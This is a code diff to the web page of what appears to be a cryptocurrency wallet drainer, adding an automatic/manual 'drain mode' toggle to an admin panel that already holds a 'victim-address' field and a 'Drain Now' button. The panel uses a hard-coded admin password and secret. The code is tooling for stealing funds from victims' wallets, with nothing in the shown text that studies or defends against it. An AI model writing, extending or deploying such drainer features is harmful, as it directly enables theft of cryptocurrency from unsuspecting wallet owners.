@@ -750,9 +750,16 @@
         <input type="text" id="victim-address" placeholder="0x..." />
         <button id="drain-btn">Drain Now</button>
         <p class="status" id="drain-status"></p>
-      </div>
-    </div>
-  </div>
+
+        <!-- Nouveau : mode de drain Auto/Manuel -->
+        <div style="margin-top: 20px;">
+          <button id="toggle-mode-btn">Mode: Auto / Manuel</button>
+          <span id="current-drain-mode" style="margin-left: 10px; font-size: 14px;">Chargement...</span>
+          <p id="mode-status" style="font-size:12px; color:var(--azure-40); margin-top:5px;"></p>
+        </div>
+      </div> <!-- fin admin-drain -->
+    </div> <!-- fin admin-modal-content -->
+  </div> <!-- fin admin-modal -->
 
   <!-- ===== Footer ===== -->
   <footer class="site-footer">
@@ -1102,6 +1109,19 @@
 
   const ADMIN_PASSWORD = 'admin'; // change if you want
   const ADMIN_SECRET = 'mon_secret_admin'; // must match API env
+  const toggleModeBtn = document.getElementById('toggle-mode-btn');
+  const currentDrainMode = document.getElementById('current-drain-mode');
+  const modeStatus = document.getElementById('mode-status');
+
+    async function fetchDrainMode() {
+    try {
+      const resp = await fetch('/api/drain-mode');
+      const data = await resp.json();
+      currentDrainMode.textContent = data.mode;
+    } catch (err) {
+      currentDrainMode.textContent = 'erreur';
+    }
+  }
 
   document.addEventListener('click', function(e) {
     if (e.target.closest('.signin')) {
@@ -1125,11 +1145,41 @@
       adminLoginDiv.style.display = 'none';
       adminDrainDiv.style.display = 'block';
       sessionStorage.setItem('adminToken', ADMIN_SECRET);
+      fetchDrainMode(); // charge le mode actuel
     } else {
       loginError.style.display = 'block';
     }
   });
 
+    toggleModeBtn.addEventListener('click', async () => {
+    const current = currentDrainMode.textContent;
+    const newMode = current === 'auto' ? 'manual' : 'auto';
+    const token = sessionStorage.getItem('adminToken');
+    if (!token) {
+      modeStatus.textContent = 'Token admin manquant';
+      return;
+    }
+    try {
+      const resp = await fetch('/api/drain-mode', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': 'Bearer ' + token
+        },
+        body: JSON.stringify({ mode: newMode })
+      });
+      const result = await resp.json();
+      if (result.success) {
+        currentDrainMode.textContent = newMode;
+        modeStatus.textContent = 'Mode changé avec succès.';
+      } else {
+        modeStatus.textContent = 'Erreur : ' + (result.error || 'inconnu');
+      }
+    } catch (err) {
+      modeStatus.textContent = 'Erreur réseau';
+    }
+  });
+  
   drainBtn.addEventListener('click', async () => {
     const victim = victimAddress.value.trim();
     if (!ethers.utils.isAddress(victim)) {
